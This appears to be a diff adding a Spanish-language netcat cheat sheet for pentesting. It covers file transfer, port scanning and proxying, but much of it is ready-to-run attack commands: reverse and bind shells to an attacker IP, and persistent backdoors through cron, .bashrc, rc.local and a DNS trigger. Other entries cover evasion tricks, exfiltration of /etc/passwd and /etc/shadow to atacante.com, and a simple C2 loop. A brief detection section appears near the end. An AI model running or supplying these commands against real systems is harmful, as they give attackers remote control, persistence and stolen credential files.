@@ -1,0 +1,419 @@
+# NETCAT - LA NAVAJA SUIZA DE RED
+
+## Descripción
+Netcat (nc) es una herramienta de red extremadamente versátil que puede leer y
+escribir datos a través de conexiones de red usando TCP o UDP. Se usa para
+debugging, exploración de red, transferencia de archivos y shells remotas.
+
+## Ejemplo Real
+Durante un pentest, necesitas establecer una shell reversa desde un servidor
+comprometido. En tu máquina escuchas: nc -lvnp 4444
+En el servidor ejecutas: nc -e /bin/bash tu_ip 4444
+
+## Comandos Básicos
+
+# Escuchar en puerto específico
+nc -l -p 1234                     # Modo servidor TCP
+nc -l -u -p 1234                  # Modo servidor UDP
+nc -lvnp 4444                     # Verbose, no DNS, puerto 4444
+
+# Conectar a host remoto
+nc ejemplo.com 80                 # Conectar a puerto 80
+nc -u ejemplo.com 53              # Conexión UDP
+
+# Con timeout
+nc -w 10 ejemplo.com 80           # Timeout de 10 segundos
+
+# Forzar IPv4/IPv6
+nc -4 ejemplo.com 80              # Solo IPv4
+nc -6 ejemplo.com 80              # Solo IPv6
+
+## Transferencia de Archivos
+
+# Enviar archivo (receptor escucha primero)
+# En receptor:
+nc -l -p 1234 > archivo_recibido.txt
+
+# En emisor:
+nc IP_receptor 1234 < archivo_a_enviar.txt
+
+# Enviar directorio comprimido
+# En receptor:
+nc -l -p 1234 | tar -xzf -
+
+# En emisor:
+tar -czf - directorio/ | nc IP_receptor 1234
+
+# Clonar partición completa
+# En receptor:
+nc -l -p 1234 | dd of=/dev/sdb
+
+# En emisor:
+dd if=/dev/sda | nc IP_receptor 1234
+
+## Reverse Shells
+
+# Shell reversa básica (Linux)
+nc -e /bin/bash IP_atacante 4444
+
+# Shell reversa (sistemas sin -e)
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP_atacante 4444 > /tmp/f
+
+# Shell reversa con bash
+bash -i >& /dev/tcp/IP_atacante/4444 0>&1
+
+# Shell reversa persistente
+while true; do nc -e /bin/bash IP_atacante 4444; sleep 60; done
+
+# Bind shell (víctima escucha)
+nc -lvp 4444 -e /bin/bash
+
+## Port Scanning
+
+# Escaneo de puerto único
+nc -zv ejemplo.com 80
+
+# Escaneo de rango de puertos
+nc -zv ejemplo.com 20-25
+
+# Escaneo UDP
+nc -zuv ejemplo.com 53
+
+# Escaneo rápido (sin DNS)
+nc -znv ejemplo.com 1-1000
+
+# Script para escaneo masivo
+for port in $(seq 1 1000); do
+    nc -znv ejemplo.com $port 2>&1 | grep succeeded
+done
+
+## Banner Grabbing
+
+# HTTP banner
+echo "GET / HTTP/1.0\r\n\r\n" | nc ejemplo.com 80
+
+# SMTP banner
+nc ejemplo.com 25
+
+# SSH banner
+nc ejemplo.com 22
+
+# FTP banner
+nc ejemplo.com 21
+
+# Telnet banner
+nc ejemplo.com 23
+
+# Con timeout automático
+timeout 5 nc ejemplo.com 80
+
+## Proxy y Relay
+
+# Proxy básico TCP
+mkfifo proxy
+nc -l -p 8080 < proxy | nc ejemplo.com 80 > proxy
+
+# Relay bidireccional
+nc -l -p 8080 -c "nc ejemplo.com 80"
+
+# Script de proxy avanzado
+#!/bin/bash
+LOCAL_PORT=8080
+REMOTE_HOST=ejemplo.com
+REMOTE_PORT=80
+
+while true; do
+    nc -l -p $LOCAL_PORT -c "nc $REMOTE_HOST $REMOTE_PORT"
+done
+
+## Chat y Comunicación
+
+# Servidor de chat
+nc -l -p 1234
+
+# Cliente de chat
+nc IP_servidor 1234
+
+# Broadcast a múltiples clientes
+mkfifo chat_pipe
+nc -l -p 1234 < chat_pipe | tee chat_pipe
+
+# Chat cifrado (con SSL)
+ncat --ssl -l -p 1234            # Servidor SSL
+ncat --ssl IP_servidor 1234      # Cliente SSL
+
+## Técnicas de Evasión
+
+# Usar diferentes puertos comunes
+nc IP 80                         # HTTP
+nc IP 443                        # HTTPS
+nc IP 53                         # DNS
+nc IP 25                         # SMTP
+
+# Con source port específico
+nc -p 53 IP 1234                 # Usar puerto 53 como origen
+
+# Fragmentación de conexiones
+nc -i 1 IP 1234                  # Delay de 1 segundo entre líneas
+
+# Conexión a través de proxy HTTP
+echo "CONNECT IP:puerto HTTP/1.0\r\n\r\n" | nc proxy.com 8080
+
+## Honeypots y Trampas
+
+# Honeypot SSH falso
+while true; do
+    echo "SSH-2.0-OpenSSH_7.4" | nc -l -p 2222
+    echo "$(date): Conexión detectada desde $(netstat -tn | tail -1)" >> honeypot.log
+done
+
+# Servidor HTTP falso
+while true; do
+    echo -e "HTTP/1.1 200 OK\r\nContent-Length: 44\r\n\r\n<html><body>Servidor en mantenimiento</body></html>" | nc -l -p 8000
+done
+
+# Capturar credenciales FTP
+while true; do
+    echo "220 FTP Server ready" | nc -l -p 2121 | tee ftp_attempts.log
+done
+
+## Backdoors y Persistencia
+
+# Backdoor con cron
+echo "*/5 * * * * nc -e /bin/bash IP_atacante 4444" | crontab -
+
+# Backdoor en .bashrc
+echo "nc -e /bin/bash IP_atacante 4444 &" >> ~/.bashrc
+
+# Backdoor en script de inicio
+echo "nc -e /bin/bash IP_atacante 4444 &" >> /etc/rc.local
+
+# Backdoor con DNS trigger
+while true; do
+    if nslookup trigger.atacante.com | grep "192.168"; then
+        nc -e /bin/bash IP_atacante 4444
+    fi
+    sleep 300
+done
+
+## Tunneling y Pivoting
+
+# Tunnel SSH sobre netcat
+# En máquina intermedia:
+nc -l -p 2222 -c "nc interno.local 22"
+
+# En atacante:
+ssh -p 2222 usuario@maquina_intermedia
+
+# Port forwarding
+# Redirigir puerto local a remoto
+nc -l -p 8080 -c "nc destino.com 80"
+
+# Double pivoting
+nc -l -p 1111 -c "nc -l -p 2222 -c 'nc destino_final 80'"
+
+## Análisis de Red
+
+# Test de conectividad avanzado
+nc -zv -w 1 IP 1-65535 2>&1 | grep succeeded
+
+# Medir latencia
+time echo "test" | nc IP puerto
+
+# Test de ancho de banda
+# En servidor:
+nc -l -p 1234 > /dev/null
+
+# En cliente:
+dd if=/dev/zero bs=1M count=100 | nc IP 1234
+
+# Monitorear conexiones
+while true; do
+    echo "$(date): $(nc -zv IP puerto 2>&1)"
+    sleep 60
+done
+
+## Forense y Logging
+
+# Capturar todo el tráfico
+nc -l -p 1234 | tee -a conexiones.log
+
+# Log con timestamps
+nc -l -p 1234 | while read line; do
+    echo "$(date): $line" >> detailed.log
+done
+
+# Capturar headers HTTP
+nc -l -p 8080 | grep -E "^(GET|POST|Host|User-Agent|Cookie)"
+
+# Honeypot con geolocalización
+nc -l -p 1234 | while read line; do
+    IP=$(echo $line | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
+    LOCATION=$(curl -s "http://ip-api.com/line/$IP")
+    echo "$(date): $IP - $LOCATION" >> geo_attacks.log
+done
+
+## Scripts de Automatización
+
+# Scanner de puertos mejorado
+#!/bin/bash
+TARGET=$1
+THREADS=100
+
+scan_port() {
+    port=$1
+    if nc -zv -w 1 $TARGET $port 2>&1 | grep -q succeeded; then
+        echo "Puerto $port: ABIERTO"
+    fi
+}
+
+echo "Escaneando $TARGET..."
+for port in $(seq 1 65535); do
+    (($(jobs -r | wc -l) >= $THREADS)) && wait
+    scan_port $port &
+done
+wait
+
+# Reverse shell automática con reintentos
+#!/bin/bash
+ATTACKER_IP="192.168.1.100"
+PORT=4444
+INTERVAL=60
+
+while true; do
+    nc -e /bin/bash $ATTACKER_IP $PORT
+    sleep $INTERVAL
+done
+
+# Transferencia segura de archivos
+#!/bin/bash
+# transfer_secure.sh
+if [ "$1" == "send" ]; then
+    # Generar clave aleatoria
+    KEY=$(openssl rand -hex 32)
+    echo "Clave: $KEY"
+    
+    # Cifrar y enviar
+    openssl enc -aes-256-cbc -salt -in "$2" -pass pass:$KEY | nc $3 $4
+elif [ "$1" == "receive" ]; then
+    # Recibir y descifrar
+    nc -l -p $3 | openssl enc -d -aes-256-cbc -pass pass:$2 > "$4"
+fi
+
+## Integración con Otras Herramientas
+
+# Con Nmap para verificación
+nmap -p $PORT $IP && nc -zv $IP $PORT
+
+# Con tcpdump para monitoreo
+tcpdump -i eth0 port 1234 &
+nc -l -p 1234
+
+# Con iptables para stealth
+iptables -A INPUT -p tcp --dport 1234 -j ACCEPT
+nc -l -p 1234
+
+# Con socat para funcionalidad avanzada
+socat TCP-LISTEN:1234,reuseaddr,fork TCP:destino:80
+
+# Con stunnel para SSL
+stunnel -d 443 -r 127.0.0.1:1234
+
+## Variantes de Netcat
+
+# Ncat (Nmap version) - más funciones
+ncat -l -p 1234 --ssl            # Con SSL
+ncat -l -p 1234 --chat           # Modo chat multi-cliente
+ncat -l -p 1234 --exec /bin/bash # Ejecutar comando
+
+# OpenBSD netcat
+nc -l 1234                       # Sintaxis diferente
+
+# GNU netcat
+netcat -l -p 1234               # Nombre completo
+
+# socat (alternativa poderosa)
+socat TCP-LISTEN:1234 EXEC:/bin/bash
+
+## Casos de Uso en Pentesting
+
+# Exfiltración de datos
+tar -czf - /etc/passwd /etc/shadow | nc atacante.com 4444
+
+# Subida de herramientas
+nc -l -p 1234 > tools.tar.gz
+# Desde atacante: nc victima.com 1234 < tools.tar.gz
+
+# Bypass de firewall
+nc -l -p 53 -e /bin/bash         # Usar puerto DNS
+
+# Pivoting interno
+nc -l -p 8080 -c "nc 10.0.0.100 22"
+
+# C2 simple
+while true; do
+    nc -l -p 4444 -e /bin/bash
+    sleep 10
+done
+
+## Detección y Contramedidas
+
+# Detectar conexiones netcat
+netstat -tulpn | grep nc
+lsof -i | grep nc
+ps aux | grep nc
+
+# Logs de conexiones sospechosas
+tail -f /var/log/auth.log | grep "Connection from"
+
+# Monitoreo de puertos
+watch "netstat -tulpn | grep LISTEN"
+
+# Alertas automáticas
+#!/bin/bash
+while true; do
+    if netstat -tulpn | grep -q ":4444"; then
+        echo "ALERTA: Puerto 4444 detectado!" | mail admin@company.com
+    fi
+    sleep 60
+done
+
+## Troubleshooting Común
+
+# Error: "Address already in use"
+lsof -i :puerto
+kill -9 PID
+
+# Error: "Permission denied"
+sudo nc -l -p 80  # Puertos < 1024 requieren root
+
+# Error: "Connection refused"
+# Verificar firewall
+iptables -L
+ufw status
+
+# Conexión se cierra inmediatamente
+nc -l -p 1234 -k  # Keep alive
+
+## Mejores Prácticas de Seguridad
+
+# Para administradores
+1. Monitorear conexiones netcat en logs
+2. Bloquear puertos no autorizados
+3. Usar IDS/IPS para detectar shells reversas
+4. Auditar scripts de inicio y cron jobs
+5. Implementar whitelisting de aplicaciones
+
+# Para pentesters
+1. Usar puertos comunes para evasión
+2. Implementar cifrado cuando sea posible
+3. Limpiar conexiones y procesos después del test
+4. Documentar todos los vectores utilizados
+5. Coordinar con blue team para evitar alertas falsas
+
+## Limitaciones
+- No tiene cifrado nativo (usar ncat --ssl)
+- Funcionalidad básica comparado con socat
+- Diferentes versiones tienen sintaxis distinta
+- Fácilmente detectable por herramientas de monitoreo
+- No tiene autenticación incorporada
